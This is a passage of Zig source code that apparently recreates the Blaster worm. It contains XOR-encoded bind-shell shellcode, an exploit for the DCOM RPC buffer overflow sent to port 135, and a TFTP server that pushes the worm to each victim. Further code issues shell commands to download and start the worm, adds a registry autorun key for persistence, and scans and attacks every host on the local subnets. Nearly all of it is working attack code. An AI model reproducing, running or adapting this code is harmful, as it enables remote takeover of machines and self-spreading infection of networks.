    b.emit(&.{ 0x8b, 0xcc }); // mov ecx, esp ; ECX = &PROCESS_INFORMATION
    b.emit(&.{ 0x6a, 0xff }); // push -1 ; dwMilliseconds = INFINITE
    b.emit(&.{ 0xff, 0x31 }); // push [ecx] ; PROCESS_INFORMATION.hProcess
    b.emit(&.{ 0xff, 0x56, 0x0c }); // call [esi+0x0c] ; WaitForSingleObject(hProcess, INFINITE)
    b.emit(&.{ 0x8b, 0xc8 }); // mov ecx, eax ; wait result
    b.emit(&.{0x57}); // push edi
    b.emit(&.{ 0xff, 0x56, 0x2c }); // call [esi+0x2c] ; closesocket(edi)
    b.emit(&.{ 0xff, 0x56, 0x14 }); // call [esi+0x14] ; ExitProcess
}

// find_kernel32: walk the PEB module list to locate the kernel32 base.
// Returns the base in EAX. `ret 4` discards 4 bytes of scratch stack.
fn shellcodeBlockKernel32(b: *ShellcodeAsm) void {
    b.emit(&.{0x55}); // push ebp
    b.emit(&.{0x56}); // push esi
    b.emit(&.{ 0x64, 0xa1, 0x30, 0x00, 0x00, 0x00 }); // mov eax, fs:[0x30] ; TEB->ProcessEnvironmentBlock
    b.emit(&.{ 0x85, 0xc0 }); // test eax, eax ; sign bit set => Win9x
    b.emit(&.{ 0x78, 0x0c }); // js +0x0c ; take the Win9x path
    b.emit(&.{ 0x8b, 0x40, 0x0c }); // mov eax, [eax+0xc] ; PEB->Ldr
    b.emit(&.{ 0x8b, 0x70, 0x1c }); // mov esi, [eax+0x1c] ; Ldr->InMemoryOrderModuleList.Flink
    b.emit(&.{0xad}); // lodsd ; first entry = kernel32
    b.emit(&.{ 0x8b, 0x68, 0x08 }); // mov ebp, [eax+0x8] ; entry->DllBase
    b.emit(&.{ 0xeb, 0x09 }); // jmp +9 ; join the common path
    b.emit(&.{ 0x8b, 0x40, 0x34 }); // mov eax, [eax+0x34] ; Win9x: TEB->WOW32Reserved... process heap chain
    b.emit(&.{ 0x8b, 0xa8, 0xb8, 0x00, 0x00, 0x00 }); // mov ebp, [eax+0xb8] ; Win9x kernel32 base
    b.emit(&.{ 0x8b, 0xc5 }); // mov eax, ebp ; EAX = kernel32 base
    b.emit(&.{0x5e}); // pop esi
    b.emit(&.{0x5d}); // pop ebp
    b.emit(&.{ 0xc2, 0x04, 0x00 }); // ret 4
}

// find_function(module_base, hash): walk the module's PE export table and
// return the address of the function whose ror13 name hash matches, or 0.
// The caller pushes the module base first and the hash second; EBP receives
// the module base and the compare reads the hash from [esp+0x14]. `ret 4`
// pops the hash argument (the module push is left on the stack, harmless).
fn shellcodeBlockFindFunction(b: *ShellcodeAsm) void {
    b.emit(&.{0x53}); // push ebx
    b.emit(&.{0x55}); // push ebp
    b.emit(&.{0x56}); // push esi
    b.emit(&.{0x57}); // push edi
    b.emit(&.{ 0x8b, 0x6c, 0x24, 0x18 }); // mov ebp, [esp+0x18] ; module base
    b.emit(&.{ 0x8b, 0x45, 0x3c }); // mov eax, [ebp+0x3c] ; DOS->e_lfanew
    b.emit(&.{ 0x8b, 0x54, 0x05, 0x78 }); // mov edx, [ebp+eax+0x78] ; PE->export directory RVA
    b.emit(&.{ 0x03, 0xd5 }); // add edx, ebp ; export directory VA
    b.emit(&.{ 0x8b, 0x4a, 0x18 }); // mov ecx, [edx+0x18] ; NumberOfNames
    b.emit(&.{ 0x8b, 0x5a, 0x20 }); // mov ebx, [edx+0x20] ; AddressOfNames RVA
    b.emit(&.{ 0x03, 0xdd }); // add ebx, ebp ; AddressOfNames VA
    b.emit(&.{ 0xe3, 0x32 }); // jecxz +0x32 ; no names => not found
    b.emit(&.{0x49}); // dec ecx ; search names from the last one down
    b.emit(&.{ 0x8b, 0x34, 0x8b }); // mov esi, [ebx+ecx*4] ; name RVA
    b.emit(&.{ 0x03, 0xf5 }); // add esi, ebp ; name VA
    b.emit(&.{ 0x33, 0xff }); // xor edi, edi ; hash accumulator
    b.emit(&.{0xfc}); // cld ; lodsb goes forward
    b.emit(&.{ 0x33, 0xc0 }); // xor eax, eax ; keeps AH = 0 as the terminator marker
    b.emit(&.{0xac}); // lodsb ; AL = next name byte
    b.emit(&.{ 0x3a, 0xc4 }); // cmp ah, al ; NUL terminator reached?
    b.emit(&.{ 0x74, 0x07 }); // je +7 ; done hashing
    b.emit(&.{ 0xc1, 0xcf, 0x0d }); // ror edi, 13
    b.emit(&.{ 0x03, 0xf8 }); // add edi, eax
    b.emit(&.{ 0xeb, 0xf2 }); // jmp -14 ; back to lodsb
    b.emit(&.{ 0x3b, 0x7c, 0x24, 0x14 }); // cmp edi, [esp+0x14] ; wanted hash?
    b.emit(&.{ 0x75, 0xe1 }); // jne -0x1f ; next name
    b.emit(&.{ 0x8b, 0x5a, 0x24 }); // mov ebx, [edx+0x24] ; AddressOfNameOrdinals RVA
    b.emit(&.{ 0x03, 0xdd }); // add ebx, ebp
    b.emit(&.{ 0x66, 0x8b, 0x0c, 0x4b }); // mov cx, [ebx+ecx*2] ; name ordinal
    b.emit(&.{ 0x8b, 0x5a, 0x1c }); // mov ebx, [edx+0x1c] ; AddressOfFunctions RVA
    b.emit(&.{ 0x03, 0xdd }); // add ebx, ebp
    b.emit(&.{ 0x8b, 0x04, 0x8b }); // mov eax, [ebx+ecx*4] ; function RVA
    b.emit(&.{ 0x03, 0xc5 }); // add eax, ebp ; function VA
    b.emit(&.{ 0xeb, 0x02 }); // jmp +2 ; skip the not-found path
    b.emit(&.{ 0x33, 0xc0 }); // xor eax, eax ; not found
    b.emit(&.{ 0x8b, 0xd5 }); // mov edx, ebp
    b.emit(&.{0x5f}); // pop edi
    b.emit(&.{0x5e}); // pop esi
    b.emit(&.{0x5d}); // pop ebp
    b.emit(&.{0x5b}); // pop ebx
    b.emit(&.{ 0xc2, 0x04, 0x00 }); // ret 4
}

// Build the bind shell:
//   1. assemble the blocks above (main body, find_kernel32, find_function)
//   2. pad the body with NOPs to a dword multiple, plus 2 slack dwords so the
//      fixed-length decode loop never reads past the buffer
//   3. xor32-encrypt every dword with the key 0xb5dbfc64
//   4. prepend the 32-byte decoder stub
pub const bind_shellcode = blk: {
    @setEvalBranchQuota(1000000);

    var b: ShellcodeAsm = .{};
    shellcodeBlockMain(&b);
    b.label("kernel32");
    shellcodeBlockKernel32(&b);
    b.label("find_function");
    shellcodeBlockFindFunction(&b);
    const body = b.finish();

    var body_len = body.len;
    body_len += (4 - body_len % 4) % 4;
    body_len += 2 * 4;
    const dwords = body_len / 4;

    var cipher: [body_len]u8 = @splat(0x90);
    @memcpy(cipher[0..body.len], body);
    for (0..dwords) |i| {
        for (0..4) |j| {
            cipher[i * 4 + j] ^= @truncate(@as(u32, 0xb5dbfc64) >> (8 * j));
        }
    }

    var out: [32 + body_len]u8 = undefined;
    out[0] = 0xeb; // jmp +0x19 -> the `call` below
    out[1] = 0x19;
    out[2] = 0x5e; // pop esi ; ESI = ciphertext address pushed by the call
    out[3] = 0x31; // xor ecx, ecx
    out[4] = 0xc9;
    out[5] = 0x81; // sub ecx, <dwords> ; decode loop counter
    out[6] = 0xe9;
    const neg_dwords: u32 = @bitCast(-@as(i32, @intCast(dwords)));
    for (0..4) |i| {
        out[7 + i] = @truncate(neg_dwords >> (8 * i));
    }
    out[11] = 0x81; // xor dword [esi], 0xb5dbfc64 ; decode one dword
    out[12] = 0x36;
    for (0..4) |i| {
        out[13 + i] = @truncate(@as(u32, 0xb5dbfc64) >> (8 * i));
    }
    out[17] = 0x81; // sub esi, -4 ; advance to the next dword
    out[18] = 0xee;
    out[19] = 0xfc; // imm32 = -4
    out[20] = 0xff;
    out[21] = 0xff;
    out[22] = 0xff;
    out[23] = 0xe2; // loop -14 ; back to the xor
    out[24] = 0xf2;
    out[25] = 0xeb; // jmp +5 -> the decoded body
    out[26] = 0x05;
    out[27] = 0xe8; // call -0x1e -> the decoder, pushing the ciphertext address
    out[28] = 0xe2;
    out[29] = 0xff;
    out[30] = 0xff;
    out[31] = 0xff;
    @memcpy(out[32..], &cipher);
    break :blk out;
};

// bind shell helpers
/// standard create tcp connection
fn connectTcp(target: IPv4, port: u16) !usize {
    const sock = socket(2, 1, 6); // AF_INET, SOCK_STREAM, IPPROTO_TCP
    if (sock == invalid_socket) return error.SocketFailed;
    errdefer _ = closesocket(sock);

    const address = sockaddr_in{
        .port = std.mem.nativeToBig(u16, port),
        .ip = target,
    };
    if (connect(sock, &address, @sizeOf(sockaddr_in)) != 0) return error.ConnectFailed;
    return sock;
}

/// standard send data over socket
fn sendAll(sock: usize, bytes: []const u8) !void {
    var offset: usize = 0;
    while (offset < bytes.len) {
        const remaining = bytes.len - offset;
        const chunk: i32 = @intCast(@min(remaining, @as(usize, std.math.maxInt(i32))));
        const sent = send(sock, bytes.ptr + offset, chunk, 0);
        if (sent <= 0) return error.SendFailed;
        offset += @intCast(sent);
    }
}

/// standard wait
fn waitReadable(sock: usize, timeout_ms: u32) bool {
    var set = fd_set{ .count = 1 };
    set.sockets[0] = sock;

    const wait = timeval{
        .seconds = @intCast(timeout_ms / 1000),
        .microseconds = @intCast((timeout_ms % 1000) * 1000),
    };
    return select(0, &set, null, null, &wait) > 0;
}

/// wait a bit, then check recv data
fn receiveBindAck(sock: usize) !void {
    if (!waitReadable(sock, 2000)) {
        dbg("no RPC bind response within 2s (RPCSS not listening on 135?)", .{});
        return error.BindTimeout;
    }

    var response: [512]u8 = undefined;
    const received = recv(sock, &response, response.len, 0);
    if (received < 10) {
        dbg("bind response too short: {d} bytes", .{received});
        return error.BindFailed;
    }

    dbg("bind response: pdu_type={d} ({d} bytes)", .{ response[2], received });

    // BIND_ACK is 12; ALTER_CONTEXT_RESP is 15. BIND_NACK is 13.
    if (response[2] != 12 and response[2] != 15) {
        dbg("unexpected PDU type {d} (want 12/15) — likely BIND_NACK", .{response[2]});
        return error.BindFailed;
    }
}

/// this actually sends the crafted payload
pub fn sendTrigger(target: IPv4, request_pdu: []const u8) !void {
    dbg("connecting to {f}:135", .{dotted(target)});
    const sock = try connectTcp(target, 135);
    defer _ = closesocket(sock);

    dbg("connected, sending DCERPC bind ({d} bytes)", .{dcerpc_bind_pdu.len});
    try sendAll(sock, &dcerpc_bind_pdu);
    try receiveBindAck(sock);
    dbg("bind ack ok, sending exploit PDU ({d} bytes)", .{request_pdu.len});
    try sendAll(sock, request_pdu);
    dbg("exploit PDU sent", .{});
}

/// standard retry logic
pub fn connectWithRetry(
    target: IPv4,
    port: u16,
    attempts: u32,
    delay_ms: u32,
) !usize {
    var attempt: u32 = 0;
    while (attempt < attempts) : (attempt += 1) {
        if (connectTcp(target, port)) |sock| {
            dbg("connect {f}:{d} ok", .{ dotted(target), port });
            return sock;
        } else |_| {
            dbg("connect {f}:{d} attempt {d}/{d} failed wsa={d}", .{ dotted(target), port, attempt + 1, attempts, WSAGetLastError() });
            if (delay_ms != 0) Sleep(delay_ms);
        }
    }
    dbg("connect {f}:{d} failed", .{ dotted(target), port });
    return error.ConnectTimeout;
}

/// returns handle to bind shell
pub fn exploitBindShell(
    target: IPv4,
    request_pdu: []const u8,
    shell_port: u16,
) !usize {
    const t0 = GetTickCount();
    try sendTrigger(target, request_pdu);

    // A bind shell needs time to start listening after the RPC thread is hijacked.
    dbg("waiting for bind shell on :{d}", .{shell_port});
    const sock = try connectWithRetry(target, shell_port, 40, 500);
    dbg("bind shell up after {d}ms", .{GetTickCount() - t0});
    return sock;
}

/// helper for sending commands to bind shell (windows required \r\n)
pub fn sendCommand(shell: usize, command: []const u8) !void {
    dbg("shell cmd: {s}", .{command});
    try sendAll(shell, command);
    try sendAll(shell, "\r\n");
}

/// Drain and log anything the bind shell has written (cmd prompt, tftp.exe
/// progress/errors). Non-printables become dots so binary junk stays readable.
fn drainShell(shell: usize, timeout_ms: u32) void {
    while (waitReadable(shell, timeout_ms)) {
        var buf: [1025]u8 = undefined;
        const n = recv(shell, &buf, 1024, 0);
        if (n <= 0) return;
        buf[@intCast(n)] = 0;
        for (buf[0..@intCast(n)]) |*b| {
            if (b.* < 0x20 and b.* != '\r' and b.* != '\n' and b.* != '\t') b.* = '.';
        }
        dbg("[shell] {s}", .{buf[0..@intCast(n)]});
    }
}

/// really bad TFTP server implementation, similar to the original blaster version
/// honestly I am just kind of lazy, in a follow up I will probably update this to make it more
/// robust
pub fn serveTFTP(_: ?*anyopaque) callconv(.winapi) u32 {
    dbg("[tftp] thread starting", .{});
    const fd = socket(2, 2, 17); // AF_INET, SOCK_DGRAM, IPPROTO_UDP.
    if (fd == invalid_socket) {
        dbg("[tftp] socket() failed wsa={d}", .{WSAGetLastError()});
        return 1;
    }
    defer _ = closesocket(fd);

    const server: sockaddr_in = .{ .port = std.mem.nativeToBig(u16, TFTP_PORT), .ip = .{ 0, 0, 0, 0 } };
    if (bind(fd, &server, @sizeOf(sockaddr_in)) != 0) {
        dbg("[tftp] bind 0.0.0.0:69 failed wsa={d}", .{WSAGetLastError()});
        return 1;
    }
    dbg("[tftp] listening on 0.0.0.0:69, waiting for RRQ", .{});

    // Receive a packet
    var reqbuf: [516]u8 = undefined;
    var client: sockaddr_in = undefined;
    var sizeof_client: i32 = @sizeOf(sockaddr_in);
    const req_len = recvfrom(fd, &reqbuf, reqbuf.len, 0, &client, &sizeof_client);
    if (req_len <= 0) {
        dbg("[tftp] recvfrom failed/empty wsa={d}", .{WSAGetLastError()});
        return 1;
    }
    dbg("[tftp] got {d}-byte request from {f}:{d}", .{
        req_len,
        dotted(client.ip),
        std.mem.bigToNative(u16, client.port),
    });
    if (req_len >= 2) {
        const opcode = (@as(u16, reqbuf[0]) << 8) | reqbuf[1];
        dbg("[tftp] opcode={d}", .{opcode});
    }
    if (req_len > 2) {
        const fname_len = std.mem.indexOfScalar(u8, reqbuf[2..@intCast(req_len)], 0) orelse @as(usize, @intCast(req_len - 2));
        dbg("[tftp] filename: {s}", .{reqbuf[2 .. 2 + fname_len]});
    }

    const fp = CreateFileA(&msblast_filename, 0x80000000, 1, NULL, 3, 0x08000080, NULL);
    // GENERIC_READ, FILE_SHARE_READ, OPEN_EXISTING, SEQUENTIAL_SCAN | NORMAL.
    if (fp == invalid_handle) {
        dbg("[tftp] CreateFileA failed err={d} path={s}", .{ GetLastError(), msblast_filename });
        return 1;
    }
    defer _ = CloseHandle(@ptrFromInt(fp));
    dbg("[tftp] opened {s}, sending blocks (ack-lockstep)", .{msblast_filename});

    // Send 512-byte blocks, waiting for the client ACK of each before the
    // next. The original worm blasted every block with no ACKs
    var data: [512]u8 = undefined;
    var block_id: u16 = 0;
    while (true) {
        block_id +%= 1;

        var bytes: u32 = 0;
        if (ReadFile(fp, &data, 512, &bytes, NULL) == 0) {
            dbg("[tftp] ReadFile failed err={d}", .{GetLastError()});
            return 1;
        }

        if (sendTftpBlock(fd, &client, block_id, data[0..bytes])) |ok_client| {
            client = ok_client;
        } else |_| {
            dbg("[tftp] block {d} never acked", .{block_id});
            return 1;
        }

        if (block_id % 16 == 0) {
            dbg("[tftp] sent block {d}", .{block_id});
        }

        // A short block ends the transfer.
        if (bytes < 512) {
            dbg("[tftp] transfer done: {d} blocks ({d} bytes)", .{ block_id, @as(u32, block_id) * 512 - (512 - bytes) });
            return 0;
        }
    }
}

/// Send one TFTP DATA block and wait for the matching ACK (3 retries / 3s).
fn sendTftpBlock(fd: usize, client: *const sockaddr_in, block_id: u16, payload: []const u8) !sockaddr_in {
    var packet: [4 + 512]u8 = undefined;
    packet[0..4].* = .{ 0, 3, @intCast(block_id >> 8), @truncate(block_id) };
    @memcpy(packet[4..][0..payload.len], payload);
    const length: i32 = @intCast(payload.len + 4);

    var from: sockaddr_in = client.*;
    for (0..3) |_| {
        if (sendto(fd, &packet, length, 0, &from, @sizeOf(sockaddr_in)) != length) continue;

        if (!waitReadable(fd, 3000)) continue;

        var ackbuf: [64]u8 = undefined;
        var fromlen: i32 = @sizeOf(sockaddr_in);
        const n = recvfrom(fd, &ackbuf, ackbuf.len, 0, &from, &fromlen);
        if (n < 4) continue;
        // Opcode 4 = ACK.
        if (ackbuf[0] != 0 or ackbuf[1] != 4) continue;
        const ack_id = (@as(u16, ackbuf[2]) << 8) | ackbuf[3];
        if (ack_id == block_id) return from;
    }
    return error.AckTimeout;
}

/// The exploit used by Blaster (CVE-2003-0352) is a buffer overflow in RPCSS service.
/// The service does unbounded copies when handling UNC paths. This is not the original exploit code
/// used by the Blaster worm, it is instead based off this code
/// https://www.exploit-db.com/exploits/16749, which allow us to exploit multiple target types
/// instead of relying on the shoddy random logic in the original worm
fn exploit(sock: usize, ip: IPv4) !void {
    dbg("targeting {f}", .{dotted(ip)});

    const shellcode = &bind_shellcode; // comptime-built: bind 4444, accept, CreateProcess cmd.exe
    // cmd.exe bind shell w/ stdin/out/err redirected to
    // socket
    const payload = comptime buildPayload(shellcode);
    const stubdata = try comptime buildStubData(&payload, 0);
    const request = try comptime buildRequestPdu(&stubdata, 0);
    dbg("shellcode {d} bytes -> {d}-byte payload in {d}-byte PDU", .{ shellcode.len, payload_space, request.len });

    // socket needs to be in blocking mode
    var blocking: u32 = 0;
    if (ioctlsocket(sock, @bitCast(@as(u32, 0x8004667e)), &blocking) != 0) {
        dbg("ioctlsocket(FIONBIO off) failed wsa={d}", .{WSAGetLastError()});
        _ = closesocket(sock);
        return error.FailedSocketBinding;
    }
    // run the buffer overflow exploit with shellcode
    const shell = try exploitBindShell(ip, &request, SHELL_PORT);
    defer _ = closesocket(shell);

    // start the tftp service thread temporarily. We purposefully start a temporary tftp thread for
    // each victim as this is what the worm does, plus it makes it harder to detect the worm by
    // looking for the tftp thread. This is also a really bad way to do this, as we can spin up
    // several tftp serve threads and not handle their errors and such, overall this is a really bad
    // pattern but for now should suffice
    const tftp_thread = CreateThread(null, 0, &serveTFTP, null, 0, null);
    if (tftp_thread == null) {
        dbg("CreateThread failed err={d}", .{GetLastError()});
        return error.CreateThreadFailed;
    }
    Sleep(100); // wait for thread to start
    defer _ = CloseHandle(tftp_thread.?);
    defer _ = TerminateThread(tftp_thread.?, 0);

    // send the tftp command to the victim
    var local_ip: sockaddr_in = undefined;
    var size: i32 = @sizeOf(sockaddr_in);
    if (getsockname(sock, &local_ip, &size) != 0) {
        dbg("getsockname failed wsa={d}", .{WSAGetLastError()});
        return error.GetSockNameFail;
    }
    dbg("local addr for tftp: {f}", .{dotted(local_ip.ip)});

    // parse filename and save to C drive
    const path = std.mem.sliceTo(&msblast_filename, 0);
    const slash = std.mem.lastIndexOfScalar(u8, path, '\\');
    const name = if (slash) |i| path[i + 1 ..] else path;

    var buf: [1024]u8 = undefined;
    const tftp_command = try std.fmt.bufPrintSentinel(&buf, "tftp -i {f} GET {s} C:\\{s}", .{ dotted(local_ip.ip), name, name }, 0);
    try sendCommand(shell, tftp_command);
    // Drain the shell while the transfer runs so tftp can't stall on a full TCP window
    var wait: u32 = 0; // final WaitForSingleObject code (0 = thread signaled)
    var waited_ms: u32 = 0;
    while (waited_ms < 20000) : (waited_ms += 500) {
        wait = WaitForSingleObject(tftp_thread.?, 500);
        if (wait == 0) break;
        drainShell(shell, 0);
    }
    if (wait != 0) {
        dbg("[tftp] thread ended abnormally (wait={d})", .{wait});
        _ = TerminateThread(tftp_thread.?, 1);
        return error.TFTPTheadKilled;
    }
    dbg("[tftp] transfer finished", .{});
    drainShell(shell, 200);

    // start the worm on the victim. The original sends it twice in slightly
    // different forms, but we don't need that here
    const start_blaster_command = try std.fmt.bufPrintSentinel(&buf, "start \"\" C:\\{s}", .{name}, 0);
    try sendCommand(shell, start_blaster_command);
    drainShell(shell, 500);
    dbg("=== exploit of {f} finished ===", .{dotted(ip)});
}

pub export fn WinMainCRTStartup() callconv(.winapi) noreturn {
    // Prevent reinfecting an already infected machine via cross-process mutex
    const handle = CreateMutexA(NULL, FALSE, MUTEX_NAME);
    defer _ = CloseHandle(handle.?);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        dbg("alredy running on this machine", .{});
        ExitProcess(0);
    }

    // Initialize winsock
    var wsa_data: WSADATA = undefined;
    if (WSAStartup(0x0101, &wsa_data) != 0) {
        dbg("WSAStartup failed err={d}", .{GetLastError()});
        ExitProcess(0);
    }
    defer _ = WSACleanup();
    dbg("winsock initialized", .{});

    // get current path and create auto start reg key
    const path_len = GetModuleFileNameA(NULL, &msblast_filename, @intCast(msblast_filename.len));
    if (path_len == 0 or path_len >= msblast_filename.len) {
        dbg("couldn't get filename err={d}", .{GetLastError()});
        ExitProcess(1);
    }
    msblast_filename[path_len] = 0; // safety first

    var hKey: HKEY = undefined;
    _ = RegCreateKeyExA(HKEY_LOCAL_MACHINE, REG_KEY, 0, null, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, null, &hKey, null);
    const exe_path = std.mem.sliceTo(&msblast_filename, 0);
    _ = RegSetValueExA(hKey, REG_VALUE, 0, REG_SZ, @ptrCast(exe_path.ptr), @intCast(exe_path.len + 1));
    _ = RegCloseKey(hKey);

    // Ask Windows to fill the table
    var table: MIB_IPADDRTABLE = undefined;
    var size: u32 = @sizeOf(MIB_IPADDRTABLE);
    if (GetIpAddrTable(&table, &size, 0) != 0) {
        dbg("GetIpAddrTable failed", .{});
        ExitProcess(0);
    }

    // Only the first count rows were initialized by Windows.
    const rows = table.rows[0..table.count];
    dbg("{d} adapter row(s)", .{table.count});

    const allocator = std.heap.page_allocator;

    // Each local address row describes a subnet, index locates preceding rows.
    for (rows, 0..) |row, index| {

        // Convert to integers on which subnet masks and numeric comparisons work.
        const own = std.mem.bigToNative(u32, row.address);
        const mask = std.mem.bigToNative(u32, row.mask);

        if (!subnetEligible(row)) continue;

        // Clear host bits for the network address and set them for the broadcast.
        const network = own & mask;
        const broadcast = network | ~mask;

        // /31 and /32 have no reserved network/broadcast addresses.
        // For larger subnets, exclude both endpoints by adding/subtracting one.
        const reserved: u32 = if (~mask > 1) 1 else 0;

        // u64 lets the counter advance past 255.255.255.255 without wrapping.
        var candidate: u64 = @as(u64, network) + reserved;
        const last: u64 = broadcast - reserved;

        // Reserve space for the full candidate range.
        const capacity: usize = @intCast(last - candidate + 1);
        dbg("scanning {d}.{d}.{d}.{d} - {d}.{d}.{d}.{d} ({d} candidates)", .{
            @as(u8, @truncate(network >> 24)),
            @as(u8, @truncate(network >> 16)),
            @as(u8, @truncate(network >> 8)),
            @as(u8, @truncate(network)),
            @as(u8, @truncate(broadcast >> 24)),
            @as(u8, @truncate(broadcast >> 16)),
            @as(u8, @truncate(broadcast >> 8)),
            @as(u8, @truncate(broadcast)),
            capacity,
        });

        // Remember which target belongs to each socket
        const Pending = struct { socket: usize, ip: IPv4 };
        const pending = allocator.alloc(Pending, capacity) catch ExitProcess(0);
        defer allocator.free(pending);

        // Only pending[0..count] contains initialized entries.
        var count: usize = 0;

        // Close every retained socket (recall that defers run in reverse order)
        defer for (pending[0..count]) |entry| {
            _ = closesocket(entry.socket);
        };

        // Build a Winsock fd_set without its usual 64-socket limit.
        const storage = allocator.alloc(usize, capacity + 1) catch ExitProcess(0);
        defer allocator.free(storage);

        // View the same buffer as a native fd_set header for the select call.
        const writable: *fd_set = @ptrCast(storage.ptr);

        // This slice accesses the actual allocated socket array after the header.
        const handles = storage[1..];

        // Visit every candidate.
        candidates: while (candidate <= last) : (candidate += 1) {
            const ip: u32 = @intCast(candidate);

            // Exclude every address belonging to this computer, across all adapters.
            for (rows) |local| {
                if (ip == std.mem.bigToNative(u32, local.address)) continue :candidates;
            }

            // Avoid duplicates from overlapping adapter subnets.
            for (rows[0..index]) |previous| {
                const address = std.mem.bigToNative(u32, previous.address);
                const previous_mask = std.mem.bigToNative(u32, previous.mask);

                // Apply the same eligibility rules as the outer subnet loop.
                if (!subnetEligible(previous)) continue;
                const net = address & previous_mask;
                const skip: u32 = if (~previous_mask > 1) 1 else 0;

                // An earlier eligible subnet already attempted this candidate.
                if (ip >= @as(u64, net) + skip and ip <= (net | ~previous_mask) - skip) continue :candidates;
            }

            // AF_INET (2), SOCK_STREAM (1), IPPROTO_TCP (6).
            const sock = socket(2, 1, 6);
            if (sock == invalid_socket) continue;

            // FIONBIO is 0x8004667e; its value must be passed as a signed i32.
            // @bitCast preserves those bits. A pointed-to u32 value of 1 enables it.
            var nonblocking: u32 = 1;
            if (ioctlsocket(sock, @bitCast(@as(u32, 0x8004667e)), &nonblocking) != 0) {

                // Do not keep a socket that could block during connect.
                _ = closesocket(sock);
                continue;
            }

            // Turn the numeric IP back into network-order bytes.
            const address: sockaddr_in = .{ .ip = @bitCast(std.mem.nativeToBig(u32, ip)) };

            // Zero means immediate success. Otherwise, WSAEWOULDBLOCK (10035)
            // means the connection is in progress, so retain the socket as well.
            if (connect(sock, &address, @sizeOf(sockaddr_in)) != 0 and WSAGetLastError() != 10035) {
                _ = closesocket(sock);
                continue;
            }

            // Save this socket and target for the later select call.
            pending[count] = .{ .socket = sock, .ip = address.ip };
            count += 1;
        }

        // Avoid sleeping or passing an empty set to select.
        if (count == 0) {
            dbg("no listeners on this subnet", .{});
            continue;
        }
        dbg("{d} host(s) open/connecting, waiting for connects to settle", .{count});

        // lazy way to ensure some sockets are ready
        Sleep(5000);

        // Populate fd_set with all retained handles and its entry count.
        for (pending[0..count], 0..) |entry, i| handles[i] = entry.socket;
        writable.count = @intCast(count);

        // A zero timeval makes select poll immediately instead of waiting again.
        const wait: timeval = .{ .seconds = 0, .microseconds = 0 };

        // We only care about writefds
        if (select(0, null, writable, null, &wait) <= 0) {
            dbg("select: no writable sockets", .{});
            continue;
        }
        dbg("{d}/{d} socket(s) writable", .{ writable.count, count });

        // select rewrites the set to contain only the handles that are writable.
        for (handles[0..writable.count]) |sock| {

            // get this socket's ip from the pending array.
            for (pending[0..count]) |entry| {
                if (entry.socket != sock) continue;

                // run exploit on connected target
                exploit(entry.socket, entry.ip) catch |err| {
                    dbg("exploit {f} failed: {}", .{ dotted(entry.ip), err });
                };
                awaitEnter();
            }
        }
    }

    awaitEnter();
    ExitProcess(0);
}
